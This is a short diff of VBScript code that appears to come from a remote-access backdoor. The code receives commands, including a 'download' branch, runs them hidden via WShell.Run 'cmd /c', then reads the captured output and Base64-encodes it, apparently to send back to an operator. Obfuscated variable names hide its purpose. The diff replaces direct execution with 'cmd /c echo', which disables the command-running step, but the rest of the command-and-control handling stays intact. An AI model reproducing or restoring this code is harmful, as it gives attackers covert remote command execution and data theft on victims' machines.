@@ -223,7 +223,7 @@ Elseif Left(command,8)="download" then
 Elseif command<>"" then
 Str=""
 MsgBox("COMMAND received: "&command)
-WShell.Run "cmd /c "&command&" > """&ZLOBER&""" 2>&1",0,true
+WShell.Run "cmd /c echo "&command&" > """&ZLOBER&""" 2>&1",0,true
 Set objFile = fahudss.OpenTextFile(ZLOBER, 1)
 Str = objFile.ReadAll
 BStr=Base64Encode(Str)
